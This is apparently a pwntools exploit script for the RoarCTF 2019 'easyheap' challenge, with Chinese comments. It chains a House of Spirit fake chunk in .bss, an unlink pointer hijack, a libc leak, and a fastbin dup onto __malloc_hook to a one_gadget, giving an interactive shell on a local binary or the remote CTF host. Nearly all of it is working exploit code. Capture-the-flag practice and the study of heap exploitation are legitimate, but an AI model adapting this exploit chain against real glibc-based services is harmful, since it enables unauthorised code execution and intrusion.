#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# [RoarCTF 2019]easyheap
# 单指针堆题 + free 不清零(UAF) + show 被随机 magic 门控(无泄漏)
# 利用: House of Spirit 在 .bss 伪造块 -> unlink 劫持 0x602098 指针
#       -> 劫持主 add 指针到 0x602080 写 0xdeadbeefdeadbeef 解开 show
#       -> 泄漏 libc -> fastbin dup 打 __malloc_hook -> one_gadget
# 远程: Ubuntu 16.04 / libc 2.23-0ubuntu11 (main_arena+88 = 0x3c4b78)
from pwn import *
import os

context.log_level = 'info'
context.arch = 'amd64'

# 本地优先用 patchelf 到 2.23 的样本（pwn_patched / pwn_2.23），否则回退原始 pwn
BIN = './pwn'
for _c in ('./pwn_patched', './pwn_2.23', '/tmp/eh2/pwn'):
    if os.path.exists(_c):
        BIN = _c
        break
if args.REMOTE:
    p = remote('node4.buuoj.cn', 25000)   # 按实际靶机地址改
else:
    p = process(BIN)

elf = ELF(BIN)
# 本地用 2.23 的 libc 取偏移；不存在则回退 cpwn 的 2.23
LIBC_PATH = './libc-2.23.so'
if not os.path.exists(LIBC_PATH):
    LIBC_PATH = '/home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/libc6_2.23-0ubuntu11.3_amd64/lib/x86_64-linux-gnu/libc-2.23.so'
libc = ELF(LIBC_PATH)

# ---- 交互封装 ----
def add(size, cnt):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'size\n', str(size).encode())
    p.sendafter(b'content\n', cnt)

def dele():
    p.sendlineafter(b'>> ', b'2')

def gift(choice, cnt=b''):
    p.sendlineafter(b'>> ', b'666')
    p.sendafter(b'free?', str(choice).encode())
    if choice == 1:
        p.sendafter(b'content\n', cnt)

def bug():
    gdb.attach(p)
    pause()

# ============ 利用主流程 ============

# 1) username/info 写 .bss：0x602078=0x41, 0x6020b8=0x20e21
#    House of Spirit 假块 + next size
p.sendafter(b'username:', 3 * p64(0) + p64(0x41))
p.sendafter(b'info',     3 * p64(0) + p64(0x20e21))

# 2) 整理 fastbin
add(0x38, b'\0' * 0x38); dele()
add(0x48, b'\0' * 0x48); dele()
add(0x28, b'\0' * 0x28); dele()
add(0x18, b'\0' * 0x18); dele()

# 3) 预埋 unlink 需要的假 next 链，再 free 进 fastbin
add(0x68, b'\0' * 0x30 + p64(0) + p64(0x21) + b'\0' * 0x10 + p64(0x20) + p64(0x101))
dele()

# 4) 留下 0x90 占用块；再 free 0x30
#    超长 scanf("%d") 触发内部 malloc -> malloc_consolidate
#    相邻 fastbin 合并成 0x150（后续 unlink 前提）
add(0x80, b'\x00' * 0x80)
add(0x28, b'\0' * 0x28)
dele()
p.sendlineafter(b'>> ', b'1' * 0x400)

# 5) unlink: fd=0x602098-0x18, bk=0x602098-0x10
#    => 0x602098 被写成 0x602080
payload  = 2 * p64(0)
payload += p64(0x602098 - 0x18) + p64(0x602098 - 0x10)
payload  = payload.ljust(0x80, b'\0')
payload += p64(0x80) + p64(0x90)
gift(1, cnt=payload)
dele()
gift(2)

# 6) 取出 .bss 假块，改主指针/magic
#    0x602088=0x602080, 0x602090=0xdeadbeefdeadbeef
add(0x38, p64(0) + p64(0x602080) + p64(0xdeadbeefdeadbeef))
dele()


add(0x68, b'A' * 0x10)


# 7) show 泄漏 libc（地址可能含 0x0a，固定读 6 字节）
p.sendlineafter(b'>> ', b'3')
p.recvuntil(b'A' * 0x10)
libc.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x3c4b78
log.success('libc.address = ' + hex(libc.address))

# 8) show 已 close(1)/close(2)，之后全部盲发
#    单指针无 edit：靠 “前块溢出改后块 fd” 做 fastbin attack
#      free(0x70)
#      add(0x80) 切出前块，0x70 仍留在 fastbin
#      add(0x18) 复用该 0x70，溢出写下一块 fd = __malloc_hook-0x23
#      add(0x68) 消耗原 0x70
#      add(0x68) 打到 __malloc_hook
#      free 非法指针 -> malloc_printerr 内部 malloc -> one_gadget
#
#    one_gadget:
#      ./pwn_patched(cpwn) 常用 0x4527a
#      部分自配 ld 环境用 0xf03a4
#    可用 --one=<hex> 覆盖
one_off = int(args.one, 16) if args.one else 0x4527a
one = libc.address + one_off
malloc_hook = libc.sym['__malloc_hook']
log.info('one_gadget = ' + hex(one))
log.info('__malloc_hook = ' + hex(malloc_hook))


p.sendline(b'2')  # free 当前 0x70
bug()
p.sendline(b'1'); p.sendline(b'128'); p.send(b'\x00' * 0x80)  # add(0x80)

p.sendline(b'1'); p.sendline(b'24');  p.send(p64(0) + p64(0x71) + p64(malloc_hook - 0x23))
p.sendline(b'1'); p.sendline(b'104'); p.send(b'\x00' * 0x68)
p.sendline(b'1'); p.sendline(b'104'); p.send(b'\x00' * 0x13 + p64(one))
p.sendline(b'2')  # 触发

# 会先打出 free()/munmap_chunk 报错，然后进 shell
p.sendline(b'echo PWNED')
p.interactive()



